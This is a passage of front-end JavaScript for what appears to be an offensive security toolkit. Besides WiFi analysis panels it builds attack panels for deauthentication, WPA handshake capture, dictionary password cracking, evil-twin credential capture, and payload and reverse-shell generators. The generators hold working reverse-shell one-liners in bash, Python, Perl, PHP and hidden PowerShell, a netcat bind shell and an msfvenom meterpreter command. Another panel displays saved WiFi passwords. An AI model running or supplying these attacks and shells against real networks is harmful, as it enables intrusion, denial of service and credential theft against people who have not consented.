            body: JSON.stringify({ssid, auth_type: auth, password})
        });
        
        const data = await response.json();
        const resultsDiv = document.getElementById('security-analysis-results');
        
        if (data.error) {
            showError('security-analysis-results', data.error);
            return;
        }
        
        const riskColor = data.risk_level === 'Critical' ? '#f56565' : 
                         data.risk_level === 'High' ? '#ed8936' :
                         data.risk_level === 'Medium' ? '#ecc94b' : '#48bb78';
        
        let html = `
            <div class="result-box">
                <div style="padding: 15px; background-color: rgba(${riskColor === '#f56565' ? '245,101,101' : '237,137,54'}, 0.1); border-left: 3px solid ${riskColor}; border-radius: 5px;">
                    <strong>Risk Level:</strong> <span style="color: ${riskColor}; font-weight: bold;">${data.risk_level}</span>
                    (Score: ${data.risk_score}/100)
                </div>
                
                <h3 style="margin-top: 15px;">Vulnerabilities:</h3>
                <ul>
        `;
        
        data.vulnerabilities.forEach(v => {
            html += `<li style="color: #fca5a5;">⚠️ ${v}</li>`;
        });
        
        html += `
                </ul>
                
                <h3>Recommendations:</h3>
                <ul>
        `;
        
        data.recommendations.forEach(r => {
            html += `<li style="color: #86efac;">✓ ${r}</li>`;
        });
        
        html += '</ul></div>';
        resultsDiv.innerHTML = html;
        
    } catch (error) {
        showError('security-analysis-results', 'Failed to analyze: ' + error.message);
    }
}

// Channel Analyzer Panel
function createChannelAnalyzerPanel() {
    return `
        <div class="tool-panel">
            <h2>[WIFI] WiFi Channel Analyzer</h2>
            <p class="tool-description">Analyze WiFi channels and interference</p>
            
            <div class="form-group">
                <label>Frequency Band:</label>
                <select id="wifi-band" onchange="updateChannelOptions()">
                    <option value="2.4GHz">2.4 GHz</option>
                    <option value="5GHz">5 GHz</option>
                </select>
            </div>
            
            <div class="form-group">
                <label>Channel:</label>
                <select id="wifi-channel">
                    <option value="1">1 (2412 MHz)</option>
                    <option value="6">6 (2437 MHz)</option>
                    <option value="11">11 (2462 MHz)</option>
                </select>
            </div>
            
            <button class="btn btn-primary" onclick="analyzeChannel()">Analyze Channel</button>
            
            <div id="channel-analysis-results" style="margin-top: 20px;"></div>
        </div>
    `;
}

function updateChannelOptions() {
    const band = document.getElementById('wifi-band').value;
    const channelSelect = document.getElementById('wifi-channel');
    
    channelSelect.innerHTML = '';
    
    if (band === '2.4GHz') {
        const channels = [1, 6, 11];
        channels.forEach(ch => {
            channelSelect.innerHTML += `<option value="${ch}">${ch}</option>`;
        });
    } else {
        const channels = [36, 40, 44, 48, 149, 153, 157, 161];
        channels.forEach(ch => {
            channelSelect.innerHTML += `<option value="${ch}">${ch}</option>`;
        });
    }
}

async function analyzeChannel() {
    try {
        const channel = parseInt(document.getElementById('wifi-channel').value);
        const band = document.getElementById('wifi-band').value;
        
        showLoading('channel-analysis-results', 'Analyzing...');
        
        const response = await fetch('/api/wifi/channel-analysis', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({channel, band})
        });
        
        const data = await response.json();
        const resultsDiv = document.getElementById('channel-analysis-results');
        
        if (data.error) {
            showError('channel-analysis-results', data.error);
            return;
        }
        
        let html = `
            <div class="result-box">
                <div style="padding: 15px; background-color: rgba(72, 187, 120, 0.1); border-left: 3px solid #48bb78; border-radius: 5px;">
                    <strong>Channel:</strong> ${data.channel} (${data.band})
                    <br><strong>Recommended:</strong> ${data.recommended ? '✓ Yes' : '✗ No'}
                </div>
                
                <h3 style="margin-top: 15px;">Interference Analysis:</h3>
                <p>${data.interference_risk}</p>
        `;
        
        if (data.overlapping_channels.length > 0) {
            html += `<p><strong>Overlapping Channels:</strong> ${data.overlapping_channels.join(', ')}</p>`;
        }
        
        html += `
                <h3>Best Channels:</h3>
                <p>${data.best_channels.join(', ')}</p>
            </div>
        `;
        
        resultsDiv.innerHTML = html;
        
    } catch (error) {
        showError('channel-analysis-results', 'Failed to analyze: ' + error.message);
    }
}

// WiFi Connection Analyzer Panel
function createConnectionAnalyzerPanel() {
    return `
        <div class="tool-panel">
            <h2>[WIFI] WiFi Connection Analyzer</h2>
            <p class="tool-description">Analyze detailed information about current connection</p>
            
            <button class="btn btn-primary" onclick="analyzeConnection()" style="margin: 20px 0;">
                Get Connection Details
            </button>
            
            <div id="connection-analysis-results" style="margin-top: 20px;"></div>
        </div>
    `;
}

async function analyzeConnection() {
    try {
        showLoading('connection-analysis-results', 'Analyzing connection...');
        
        const response = await fetch('/api/wifi/connection-details');
        const data = await response.json();
        
        const resultsDiv = document.getElementById('connection-analysis-results');
        
        if (data.error) {
            showError('connection-analysis-results', data.error);
            return;
        }
        
        let html = `
            <div class="result-box" style="border-left-color: #48bb78;">
                <h3>Current Connection Details:</h3>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 15px;">
                    <div>
                        <strong style="color: #48bb78;">Network SSID:</strong>
                        <p>${data.connection_info.ssid}</p>
                    </div>
                    <div>
                        <strong style="color: #48bb78;">Authentication:</strong>
                        <p>${data.connection_info.authentication}</p>
                    </div>
                    <div>
                        <strong style="color: #48bb78;">Cipher:</strong>
                        <p>${data.connection_info.cipher}</p>
                    </div>
                    <div>
                        <strong style="color: #48bb78;">Signal Strength:</strong>
                        <p>${data.connection_info.signal}%</p>
                    </div>
                    <div>
                        <strong style="color: #48bb78;">Channel:</strong>
                        <p>${data.connection_info.channel}</p>
                    </div>
                    <div>
                        <strong style="color: #48bb78;">Standard:</strong>
                        <p>${data.connection_info.standard}</p>
                    </div>
                    <div>
                        <strong style="color: #48bb78;">TX Rate:</strong>
                        <p>${data.connection_info.tx_rate} Mbps</p>
                    </div>
                    <div>
                        <strong style="color: #48bb78;">RX Rate:</strong>
                        <p>${data.connection_info.rx_rate} Mbps</p>
                    </div>
                    <div>
                        <strong style="color: #48bb78;">Radio Type:</strong>
                        <p>${data.connection_info.radio_type}</p>
                    </div>
                    <div>
                        <strong style="color: #48bb78;">State:</strong>
                        <p>${data.connection_info.state}</p>
                    </div>
                    ${data.connection_info.password ? `
                    <div style="grid-column: 1 / -1; padding: 15px; background: rgba(0, 255, 65, 0.1); border-radius: 5px; border: 2px solid var(--accent-color); margin-top: 10px;">
                        <strong style="color: var(--accent-color); font-size: 14px;">WiFi Password:</strong>
                        <p style="font-family: 'JetBrains Mono', monospace; color: var(--accent-color); font-weight: 700; font-size: 18px; margin-top: 8px; word-break: break-all;">${data.connection_info.password}</p>
                    </div>
                    ` : ''}
                </div>
            </div>
        `;
        
        if (data.connection_history.length > 0) {
            html += `
                <div class="result-box" style="border-left-color: #4299e1; margin-top: 20px;">
                    <h3>Connection History (${data.connection_history.length}):</h3>
                    <div style="margin-top: 10px;">
            `;
            
            data.connection_history.forEach(conn => {
                html += `
                    <div style="padding: 12px; margin: 8px 0; background: var(--primary-color); border-radius: 5px; border-left: 2px solid var(--accent-color);">
                        <div style="display: flex; justify-content: space-between; align-items: center;">
                            <strong style="color: var(--text-color);">${conn.name}</strong>
                            ${conn.password ? `
                            <div style="padding: 6px 12px; background: rgba(0, 255, 65, 0.1); border-radius: 4px; border: 1px solid var(--accent-color);">
                                <span style="color: var(--accent-color); font-size: 11px; font-weight: 600;">PASSWORD: </span>
                                <span style="font-family: 'JetBrains Mono', monospace; color: var(--accent-color); font-weight: 700;">${conn.password}</span>
                            </div>
                            ` : '<span style="color: var(--text-dim); font-size: 11px;">No password saved</span>'}
                        </div>
                    </div>
                `;
            });
            
            html += `
                    </div>
                </div>
            `;
        }
        
        resultsDiv.innerHTML = html;
        
    } catch (error) {
        showError('connection-analysis-results', 'Failed to analyze: ' + error.message);
    }
}

// WiFi Password Analyzer Panel
function createPasswordAnalyzerPanel() {
    return `
        <div class="tool-panel">
            <h2>[WIFI] WiFi Password Analyzer</h2>
            <p class="tool-description">Analyze WiFi password strength</p>
            
            <div class="form-group">
                <label>WiFi Password:</label>
                <input type="password" id="wifi-password-input" placeholder="Enter password to analyze">
            </div>
            
            <button class="btn btn-primary" onclick="analyzeWiFiPassword()">Analyze Password</button>
            
            <div id="password-analysis-results" style="margin-top: 20px;"></div>
        </div>
    `;
}

async function analyzeWiFiPassword() {
    try {
        const password = document.getElementById('wifi-password-input').value;
        
        if (!password) {
            showError('password-analysis-results', 'Please enter a password');
            return;
        }
        
        showLoading('password-analysis-results', 'Analyzing password...');
        
        const response = await fetch('/api/wifi/password-strength', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({password})
        });
        
        const data = await response.json();
        const resultsDiv = document.getElementById('password-analysis-results');
        
        if (data.error) {
            showError('password-analysis-results', data.error);
            return;
        }
        
        const analysis = data.strength_analysis;
        const color = analysis.color === 'green' ? '#48bb78' : 
                     analysis.color === 'blue' ? '#4299e1' :
                     analysis.color === 'yellow' ? '#ecc94b' : '#f56565';
        
        let html = `
            <div class="result-box" style="border-left-color: ${color};">
                <h3 style="color: ${color};">Strength: ${analysis.strength}</h3>
                <p style="margin: 10px 0;"><strong>Score:</strong> ${analysis.score}/100</p>
                <p><strong>Length:</strong> ${analysis.password_length} characters</p>
                
                <h4 style="margin-top: 15px; color: #48bb78;">Character Types:</h4>
                <ul>
                    <li>Uppercase: ${analysis.has_uppercase ? '✓' : '✗'}</li>
                    <li>Lowercase: ${analysis.has_lowercase ? '✓' : '✗'}</li>
                    <li>Numbers: ${analysis.has_digits ? '✓' : '✗'}</li>
                    <li>Special Characters: ${analysis.has_special ? '✓' : '✗'}</li>
                </ul>
        `;
        
        if (analysis.feedback.length > 0) {
            html += `
                <h4 style="margin-top: 15px; color: #ed8936;">Feedback:</h4>
                <ul>
            `;
            
            analysis.feedback.forEach(fb => {
                html += `<li style="color: #fbd38d;">⚠️ ${fb}</li>`;
            });
            
            html += `</ul>`;
        }
        
        if (data.dictionary_check.vulnerable_to_dictionary_attack) {
            html += `
                <div style="margin-top: 15px; padding: 15px; background-color: rgba(245, 101, 101, 0.1); border-radius: 5px; color: #fca5a5;">
                    <strong>⚠️ Dictionary Attack Risk!</strong>
                    <p>Password matches common dictionary words</p>
                </div>
            `;
        }
        
        html += `</div>`;
        resultsDiv.innerHTML = html;
        
    } catch (error) {
        showError('password-analysis-results', 'Failed to analyze: ' + error.message);
    }
}

// Security Test Panel
function createSecurityTestPanel() {
    return `
        <div class="tool-panel">
            <h2>[WIFI] WiFi Security Vulnerability Test</h2>
            <p class="tool-description">Test for common WiFi security vulnerabilities</p>
            
            <button class="btn btn-primary" onclick="runSecurityTests()" style="margin: 20px 0;">
                Run Security Tests
            </button>
            
            <div id="security-test-results" style="margin-top: 20px;"></div>
        </div>
    `;
}

async function runSecurityTests() {
    try {
        showLoading('security-test-results', 'Running security tests...');
        
        const response = await fetch('/api/wifi/security-test');
        const data = await response.json();
        
        const resultsDiv = document.getElementById('security-test-results');
        
        if (data.error) {
            showError('security-test-results', data.error);
            return;
        }
        
        let html = `
            <div class="result-box">
                <h3>Current Connection</h3>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                    <div><strong>SSID:</strong> ${data.current_connection.ssid}</div>
                    <div><strong>Auth:</strong> ${data.current_connection.authentication}</div>
                </div>
            </div>
            
            <div class="result-box">
                <h3>Encryption Analysis</h3>
                <p><strong>Cipher:</strong> ${data.encryption_cipher_analysis.cipher}</p>
                <p><strong>Strength:</strong> <span style="color: ${data.encryption_cipher_analysis.security_score > 80 ? '#48bb78' : '#f56565'};">${data.encryption_cipher_analysis.strength}</span></p>
                <p><strong>Security Score:</strong> ${data.encryption_cipher_analysis.security_score}/100</p>
        `;
        
        if (data.encryption_cipher_analysis.vulnerabilities.length > 0) {
            html += `<div style="margin-top: 10px; padding: 10px; background-color: rgba(245, 101, 101, 0.1); border-radius: 5px;">`;
            data.encryption_cipher_analysis.vulnerabilities.forEach(v => {
                html += `<p style="color: #fca5a5;">⚠️ ${v.issue}</p>`;
            });
            html += `</div>`;
        }
        
        html += `</div>`;
        
        // WPS Test
        if (data.wps_vulnerability_test.wps_vulnerabilities.length > 0) {
            html += `
                <div class="result-box" style="border-left-color: #f56565;">
                    <h3 style="color: #f56565;">WPS Vulnerability Detected</h3>
            `;
            
            data.wps_vulnerability_test.wps_vulnerabilities.forEach(v => {
                html += `
                    <div style="margin: 10px 0; padding: 10px; background-color: rgba(245, 101, 101, 0.1); border-radius: 5px;">
                        <p><strong>${v.vulnerability}</strong> - Severity: ${v.severity}</p>
                        <p style="color: #cbd5e0;">${v.description}</p>
                        <p style="color: #48bb78;">✓ ${v.recommendation}</p>
                    </div>
                `;
            });
            
            html += `</div>`;
        }
        
        // Gateway Test
        html += `
            <div class="result-box">
                <h3>Default Gateway</h3>
                <p><strong>Gateway IP:</strong> ${data.gateway_vulnerability_test.gateway}</p>
        `;
        
        if (data.gateway_vulnerability_test.vulnerabilities.length > 0) {
            html += `<p style="color: #ed8936;">⚠️ Potential vulnerability detected</p>`;
        }
        
        html += `</div>`;
        
        resultsDiv.innerHTML = html;
        
    } catch (error) {
        showError('security-test-results', 'Failed to run tests: ' + error.message);
    }
}

// Network Mapping Panel
function createNetworkMappingPanel() {
    return `
        <div class="tool-panel">
            <h2>[NET] Network Mapping</h2>
            <p class="tool-description">Map and analyze nearby WiFi networks</p>
            
            <button class="btn btn-primary" onclick="mapNetworks()" style="margin: 20px 0;">
                Scan Networks
            </button>
            
            <div id="network-mapping-results" style="margin-top: 20px;"></div>
        </div>
    `;
}

async function mapNetworks() {
    try {
        showLoading('network-mapping-results', 'Mapping networks...');
        
        const response = await fetch('/api/wifi/network-mapping');
        const data = await response.json();
        
        const resultsDiv = document.getElementById('network-mapping-results');
        
        if (data.error) {
            showError('network-mapping-results', data.error);
            return;
        }
        
        let html = `
            <div class="result-box">
                <h3>Networks Found: ${data.total_networks}</h3>
        `;
        
        data.networks.forEach((net, idx) => {
            const riskColor = net.risk_level === 'High' ? '#f56565' : '#48bb78';
            html += `
                <div style="margin: 15px 0; padding: 15px; background-color: rgba(72, 187, 120, 0.1); border-radius: 5px; border-left: 3px solid ${riskColor};">
                    <p><strong>Network ${idx + 1}:</strong> ${net.ssid}</p>
                    <p><strong>Risk Level:</strong> <span style="color: ${riskColor};">${net.risk_level}</span></p>
                    <p><strong>Recommendations:</strong></p>
                    <ul style="margin-left: 20px;">
            `;
            
            net.recommendations.forEach(rec => {
                html += `<li style="color: #cbd5e0;">✓ ${rec}</li>`;
            });
            
            html += `
                    </ul>
                </div>
            `;
        });
        
        html += `</div>`;
        resultsDiv.innerHTML = html;
        
    } catch (error) {
        showError('network-mapping-results', 'Failed to map networks: ' + error.message);
    }
}

// Deauthentication Attack Panel
function createDeauthAttackPanel() {
    return `
        <div class="tool-panel">
            <h2>[WIFI] Deauthentication Attack</h2>
            <p class="tool-description">Send deauthentication packets to disconnect clients from a WiFi network</p>
            
            <div class="tool-form">
                <div class="form-group">
                    <label>Target BSSID</label>
                    <input type="text" id="deauth-bssid" placeholder="00:11:22:33:44:55" value="">
                </div>
                <div class="form-group">
                    <label>Client MAC (Optional)</label>
                    <input type="text" id="deauth-client" placeholder="AA:BB:CC:DD:EE:FF" value="">
                </div>
                <div class="form-group">
                    <label>Duration (seconds)</label>
                    <input type="number" id="deauth-duration" value="10" min="1" max="60">
                </div>
                <button class="btn btn-primary" onclick="performDeauthAttack()">Start Attack</button>
            </div>
            
            <div id="deauth-results" style="margin-top: 20px;"></div>
        </div>
    `;
}

async function performDeauthAttack() {
    try {
        const target_bssid = document.getElementById('deauth-bssid').value;
        const client_mac = document.getElementById('deauth-client').value;
        const duration = parseInt(document.getElementById('deauth-duration').value);
        
        if (!target_bssid) {
            showError('deauth-results', 'Target BSSID is required');
            return;
        }
        
        showLoading('deauth-results', 'Performing attack...');
        
        const response = await fetch('/api/wifi/deauth-attack', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({target_bssid, client_mac, duration})
        });
        
        const data = await response.json();
        const resultsDiv = document.getElementById('deauth-results');
        
        if (data.error) {
            showError('deauth-results', data.error);
            return;
        }
        
        let html = `
            <div class="result-box ${data.success ? 'success' : 'error'}">
                <div class="result-title">${data.success ? 'Attack Successful' : 'Attack Failed'}</div>
                <div class="result-row"><span class="result-label">Target BSSID:</span><span class="result-value">${data.target_bssid || target_bssid}</span></div>
                <div class="result-row"><span class="result-label">Packets Sent:</span><span class="result-value">${data.packets_sent || 0}</span></div>
                <div class="result-row"><span class="result-label">Duration:</span><span class="result-value">${duration} seconds</span></div>
                ${data.message ? `<div class="result-content" style="margin-top: 10px;">${data.message}</div>` : ''}
            </div>
        `;
        
        resultsDiv.innerHTML = html;
        
    } catch (error) {
        showError('deauth-results', 'Failed to perform attack: ' + error.message);
    }
}

// WPA Handshake Capturer Panel
function createWPAHandshakeCapturerPanel() {
    return `
        <div class="tool-panel">
            <h2>[WIFI] WPA Handshake Capturer</h2>
            <p class="tool-description">Capture WPA 4-way handshakes for password cracking</p>
            
            <div class="tool-form">
                <div class="form-group">
                    <label>Target BSSID</label>
                    <input type="text" id="handshake-bssid" placeholder="00:11:22:33:44:55" value="">
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label>Channel</label>
                        <input type="number" id="handshake-channel" value="6" min="1" max="165">
                    </div>
                    <div class="form-group">
                        <label>Duration (seconds)</label>
                        <input type="number" id="handshake-duration" value="30" min="10" max="300">
                    </div>
                </div>
                <button class="btn btn-primary" onclick="captureHandshake()">Start Capture</button>
            </div>
            
            <div id="handshake-results" style="margin-top: 20px;"></div>
        </div>
    `;
}

async function captureHandshake() {
    try {
        const target_bssid = document.getElementById('handshake-bssid').value;
        const channel = parseInt(document.getElementById('handshake-channel').value);
        const duration = parseInt(document.getElementById('handshake-duration').value);
        
        if (!target_bssid) {
            showError('handshake-results', 'Target BSSID is required');
            return;
        }
        
        showLoading('handshake-results', 'Capturing handshake...');
        
        const response = await fetch('/api/wifi/handshake-capture', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({target_bssid, channel, duration})
        });
        
        const data = await response.json();
        const resultsDiv = document.getElementById('handshake-results');
        
        if (data.error) {
            showError('handshake-results', data.error);
            return;
        }
        
        let html = `
            <div class="result-box ${data.handshake_captured ? 'success' : 'warning'}">
                <div class="result-title">${data.handshake_captured ? 'Handshake Captured' : 'Capture In Progress'}</div>
                <div class="result-row"><span class="result-label">Target BSSID:</span><span class="result-value">${data.target_bssid || target_bssid}</span></div>
                <div class="result-row"><span class="result-label">Channel:</span><span class="result-value">${channel}</span></div>
                <div class="result-row"><span class="result-label">Duration:</span><span class="result-value">${duration} seconds</span></div>
                ${data.capture_file ? `<div class="result-row"><span class="result-label">Capture File:</span><span class="result-value">${data.capture_file}</span></div>` : ''}
                ${data.message ? `<div class="result-content" style="margin-top: 10px;">${data.message}</div>` : ''}
            </div>
        `;
        
        resultsDiv.innerHTML = html;
        
    } catch (error) {
        showError('handshake-results', 'Failed to capture handshake: ' + error.message);
    }
}

// WiFi Password Cracker Panel
function createWiFiPasswordCrackerPanel() {
    return `
        <div class="tool-panel">
            <h2>[WIFI] WiFi Password Cracker</h2>
            <p class="tool-description">Crack WiFi passwords using dictionary attack on captured handshakes</p>
            
            <div class="tool-form">
                <div class="form-group">
                    <label>Handshake File Path</label>
                    <input type="text" id="cracker-handshake" placeholder="/path/to/handshake.cap" value="">
                </div>
                <div class="form-group">
                    <label>Wordlist File Path</label>
                    <input type="text" id="cracker-wordlist" placeholder="/path/to/wordlist.txt" value="">
                </div>
                <div class="form-group">
                    <label>Target BSSID (Optional)</label>
                    <input type="text" id="cracker-bssid" placeholder="00:11:22:33:44:55" value="">
                </div>
                <button class="btn btn-primary" onclick="crackWiFiPassword()">Start Cracking</button>
            </div>
            
            <div id="cracker-results" style="margin-top: 20px;"></div>
        </div>
    `;
}

async function crackWiFiPassword() {
    try {
        const handshake_file = document.getElementById('cracker-handshake').value;
        const wordlist_file = document.getElementById('cracker-wordlist').value;
        const target_bssid = document.getElementById('cracker-bssid').value;
        
        if (!handshake_file || !wordlist_file) {
            showError('cracker-results', 'Handshake file and wordlist file are required');
            return;
        }
        
        showLoading('cracker-results', 'Cracking password...');
        
        const response = await fetch('/api/wifi/password-crack', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({handshake_file, wordlist_file, target_bssid})
        });
        
        const data = await response.json();
        const resultsDiv = document.getElementById('cracker-results');
        
        if (data.error) {
            showError('cracker-results', data.error);
            return;
        }
        
        let html = `
            <div class="result-box ${data.password_found ? 'success' : 'warning'}">
                <div class="result-title">${data.password_found ? 'Password Found' : 'Password Not Found'}</div>
                <div class="result-row"><span class="result-label">Handshake File:</span><span class="result-value">${handshake_file}</span></div>
                <div class="result-row"><span class="result-label">Wordlist File:</span><span class="result-value">${wordlist_file}</span></div>
                ${data.password ? `<div class="result-row"><span class="result-label">Password:</span><span class="result-value" style="color: var(--accent-color); font-weight: 700;">${data.password}</span></div>` : ''}
                ${data.attempts ? `<div class="result-row"><span class="result-label">Attempts:</span><span class="result-value">${data.attempts}</span></div>` : ''}
                ${data.time_taken ? `<div class="result-row"><span class="result-label">Time Taken:</span><span class="result-value">${data.time_taken}</span></div>` : ''}
                ${data.message ? `<div class="result-content" style="margin-top: 10px;">${data.message}</div>` : ''}
            </div>
        `;
        
        resultsDiv.innerHTML = html;
        
    } catch (error) {
        showError('cracker-results', 'Failed to crack password: ' + error.message);
    }
}

// Evil Twin Attack Panel
function createEvilTwinPanel() {
    return `
        <div class="tool-panel">
            <h2>[WIFI] Evil Twin Attack</h2>
            <p class="tool-description">Create a fake access point to capture credentials</p>
            
            <div class="tool-form">
                <div class="form-group">
                    <label>SSID (Network Name)</label>
                    <input type="text" id="evil-ssid" placeholder="FreeWiFi" value="">
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label>Channel</label>
                        <input type="number" id="evil-channel" value="6" min="1" max="165">
                    </div>
                    <div class="form-group">
                        <label>Interface</label>
                        <input type="text" id="evil-interface" placeholder="wlan0" value="wlan0">
                    </div>
                </div>
                <button class="btn btn-primary" onclick="createEvilTwin()">Create Fake AP</button>
            </div>
            
            <div id="evil-results" style="margin-top: 20px;"></div>
        </div>
    `;
}

async function createEvilTwin() {
    try {
        const ssid = document.getElementById('evil-ssid').value;
        const channel = parseInt(document.getElementById('evil-channel').value);
        const interface = document.getElementById('evil-interface').value;
        
        if (!ssid) {
            showError('evil-results', 'SSID is required');
            return;
        }
        
        showLoading('evil-results', 'Creating fake access point...');
        
        const response = await fetch('/api/wifi/evil-twin', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ssid, channel, interface})
        });
        
        const data = await response.json();
        const resultsDiv = document.getElementById('evil-results');
        
        if (data.error) {
            showError('evil-results', data.error);
            return;
        }
        
        let html = `
            <div class="result-box ${data.ap_created ? 'success' : 'warning'}">
                <div class="result-title">${data.ap_created ? 'Fake AP Created' : 'AP Creation Failed'}</div>
                <div class="result-row"><span class="result-label">SSID:</span><span class="result-value">${ssid}</span></div>
                <div class="result-row"><span class="result-label">Channel:</span><span class="result-value">${channel}</span></div>
                <div class="result-row"><span class="result-label">Interface:</span><span class="result-value">${interface}</span></div>
                ${data.ap_ip ? `<div class="result-row"><span class="result-label">AP IP:</span><span class="result-value">${data.ap_ip}</span></div>` : ''}
                ${data.message ? `<div class="result-content" style="margin-top: 10px;">${data.message}</div>` : ''}
            </div>
        `;
        
        resultsDiv.innerHTML = html;
        
    } catch (error) {
        showError('evil-results', 'Failed to create evil twin: ' + error.message);
    }
}

// Exploit Framework Panel
function createExploitFrameworkPanel() {
    return `
        <div class="tool-panel">
            <h2>[EXPLOIT] Exploit Framework</h2>
            <p class="tool-description">Framework for exploit development and testing</p>
            <div class="tool-form">
                <div class="form-group">
                    <label>Target System</label>
                    <select id="exploit-target">
                        <option value="linux">Linux</option>
                        <option value="windows">Windows</option>
                        <option value="macos">macOS</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Exploit Type</label>
                    <select id="exploit-type">
                        <option value="buffer_overflow">Buffer Overflow</option>
                        <option value="format_string">Format String</option>
                        <option value="race_condition">Race Condition</option>
                    </select>
                </div>
                <button class="btn btn-primary" onclick="generateExploit()">Generate Exploit</button>
            </div>
            <div id="exploit-results"></div>
        </div>
    `;
}

async function generateExploit() {
    showLoading('exploit-results', 'Generating exploit...');
    setTimeout(() => {
        document.getElementById('exploit-results').innerHTML = `
            <div class="result-box warning">
                <div class="result-title">Exploit Framework</div>
                <div class="result-content">This tool is for educational purposes only. Use responsibly.</div>
            </div>
        `;
    }, 1000);
}

// Payload Generator Panel
function createPayloadGeneratorPanel() {
    return `
        <div class="tool-panel">
            <h2>[EXPLOIT] Payload Generator</h2>
            <p class="tool-description">Generate various payloads for penetration testing</p>
            <div class="tool-form">
                <div class="form-group">
                    <label>Payload Type</label>
                    <select id="payload-type">
                        <option value="reverse_tcp">Reverse TCP Shell</option>
                        <option value="bind_tcp">Bind TCP Shell</option>
                        <option value="meterpreter">Meterpreter</option>
                    </select>
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label>LHOST</label>
                        <input type="text" id="payload-lhost" placeholder="192.168.1.100" value="">
                    </div>
                    <div class="form-group">
                        <label>LPORT</label>
                        <input type="number" id="payload-lport" placeholder="4444" value="4444">
                    </div>
                </div>
                <button class="btn btn-primary" onclick="generatePayload()">Generate Payload</button>
            </div>
            <div id="payload-results"></div>
        </div>
    `;
}

async function generatePayload() {
    const type = document.getElementById('payload-type').value;
    const lhost = document.getElementById('payload-lhost').value;
    const lport = document.getElementById('payload-lport').value;
    
    if (!lhost) {
        showError('payload-results', 'LHOST is required');
        return;
    }
    
    showLoading('payload-results', 'Generating payload...');
    
    const payloads = {
        reverse_tcp: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
        bind_tcp: `nc -lvp ${lport} -e /bin/bash`,
        meterpreter: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe`
    };
    
    setTimeout(() => {
        document.getElementById('payload-results').innerHTML = `
            <div class="result-box success">
                <div class="result-title">Generated Payload</div>
                <div class="result-content" style="font-family: 'JetBrains Mono', monospace; padding: 15px; background: var(--primary-color); border-radius: 5px; margin-top: 10px;">
                    ${payloads[type]}
                </div>
            </div>
        `;
    }, 500);
}

// Reverse Shell Generator Panel
function createReverseShellPanel() {
    return `
        <div class="tool-panel">
            <h2>[EXPLOIT] Reverse Shell Generator</h2>
            <p class="tool-description">Generate reverse shell commands for multiple platforms</p>
            <div class="tool-form">
                <div class="form-group">
                    <label>Platform</label>
                    <select id="shell-platform">
                        <option value="bash">Bash</option>
                        <option value="python">Python</option>
                        <option value="perl">Perl</option>
                        <option value="php">PHP</option>
                        <option value="powershell">PowerShell</option>
                    </select>
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label>IP Address</label>
                        <input type="text" id="shell-ip" placeholder="192.168.1.100" value="">
                    </div>
                    <div class="form-group">
                        <label>Port</label>
                        <input type="number" id="shell-port" placeholder="4444" value="4444">
                    </div>
                </div>
                <button class="btn btn-primary" onclick="generateReverseShell()">Generate Shell</button>
            </div>
            <div id="shell-results"></div>
        </div>
    `;
}

async function generateReverseShell() {
    const platform = document.getElementById('shell-platform').value;
    const ip = document.getElementById('shell-ip').value;
    const port = document.getElementById('shell-port').value;
    
    if (!ip) {
        showError('shell-results', 'IP address is required');
        return;
    }
    
    const shells = {
        bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
        python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
        perl: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
        php: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
        powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "& {$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"`
    };
    
    showLoading('shell-results', 'Generating reverse shell...');
    
    setTimeout(() => {
        document.getElementById('shell-results').innerHTML = `
            <div class="result-box success">
                <div class="result-title">Reverse Shell Command</div>
                <div class="result-content" style="font-family: 'JetBrains Mono', monospace; padding: 15px; background: var(--primary-color); border-radius: 5px; margin-top: 10px; word-break: break-all;">
                    ${shells[platform]}
                </div>
            </div>
        `;
    }, 500);
}

// Subdomain Scanner Panel
function createSubdomainScannerPanel() {
    return `
        <div class="tool-panel">
            <h2>[RECON] Subdomain Scanner</h2>
            <p class="tool-description">Discover subdomains of a target domain</p>
            <div class="tool-form">
                <div class="form-group">
                    <label>Target Domain</label>
                    <input type="text" id="subdomain-target" placeholder="example.com" value="">
                </div>
                <div class="form-group">
                    <label>Wordlist Size</label>
                    <select id="subdomain-wordlist">
                        <option value="small">Small (1000)</option>
                        <option value="medium" selected>Medium (10000)</option>
                        <option value="large">Large (100000)</option>
                    </select>
                </div>
                <button class="btn btn-primary" onclick="scanSubdomains()">Scan Subdomains</button>
            </div>
            <div id="subdomain-results"></div>
        </div>
    `;
}

